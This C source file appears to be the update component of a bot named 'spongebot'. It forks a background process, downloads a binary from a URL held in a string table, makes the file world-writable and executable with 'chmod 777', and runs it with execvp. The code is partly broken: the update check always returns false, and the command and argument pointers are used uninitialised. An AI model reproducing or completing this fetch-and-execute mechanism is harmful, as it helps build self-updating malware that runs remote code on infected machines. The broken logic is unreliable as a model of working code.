#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <curl/curl.h>
#include <sys/types.h>

#include <dict.h>

size_t write_callback(void *ptr, size_t size, size_t nmemb, FILE *stream)
{
    return fwrite(ptr, size, nmemb, stream);
}

static bool is_update_avaible()
{
    CURL *curl;
    CURLcode res;
    FILE *fp;
    char version_file[256];
    strcpy(version_file, dict_get(UPDATER_VER_FILE));

    fp = fopen(version_file, "wb");
    if (!fp)
    {
#ifdef DEBUG
        printf("Failed to open version file\n");
#endif
        return false;
    }

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, dict_get(UPDATER_URL));
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK)
        {
#ifdef DEBUG
            fprintf(stderr, "Error during download of version: %s\n", curl_easy_strerror(res));
#endif
            fclose(fp);
            curl_easy_cleanup(curl);
            curl_global_cleanup();
            return false;
        }
        fclose(fp);
    }

    curl_easy_cleanup(curl);
    curl_global_cleanup();

    char local_version[50], remote_version[50];
    FILE *local_fp = fopen(dict_get(UPDATER_VER_FILE), "r");
    FILE *remote_fp = fopen(version_file, "r");

    if (!local_fp || !remote_fp)
    {
#ifdef DEBUG
        printf("Failed to open version files for comparison\n");
#endif
        return false;
    }

    // fgets(local_version, sizeof(local_version), local_fp);
    // fgets(remote_version, sizeof(remote_version), remote_fp);
    //
    // fclose(local_fp);
    // fclose(remote_fp);

    // return strcmp(local_version, remote_version) != 0;

    return false; // TODO now returns always false
}

void updater_init()
{
    pid_t updater_pid = fork();

    if (updater_pid < 0)
    {
#ifdef DEBUG
        printf("[updater] Error during fork\n");
#endif
        return;
    }

    if (updater_pid == 0)
    {
        if (is_update_avaible())
        {
#ifdef DEBUG
            printf("[updater] New update available. Starting download...\n");
#endif

            FILE *fp = fopen(dict_get(UPDATER_TMP_FILE), "wb");
            if (fp)
            {
                CURL *curl = curl_easy_init();
                if (curl)
                {
                    curl_easy_setopt(curl, CURLOPT_URL, dict_get(UPDATER_URL));
                    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
                    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
                    curl_easy_perform(curl);
                    curl_easy_cleanup(curl);
                    fclose(fp);
#ifdef DEBUG
                    printf("[updater] Download completed.\n");
#endif

                    //TODO add strings to dict
                    char *new_name, *_command, *args[3];
/*
                    do
                    {
                        new_name = "spongebot";
                        _command = "chmod 777 spongebot";

                        args[0] = "./spongebot";
                        args[1] = NULL;
                    } while (0);*/

                    rename(dict_get(UPDATER_TMP_FILE), new_name);
                    system(_command);
                    // char *args[] = {"./spongebot", NULL};
                    execvp(args[0], args);

#ifdef DEBUG
                    perror("execvp failed");
#endif
                    exit(1);
                }
            }
        }
        exit(0);
    }
    else
    {
#ifdef DEBUG
        printf("[updater] Updating process started on PID: %d\n", updater_pid);
#endif
    }
}
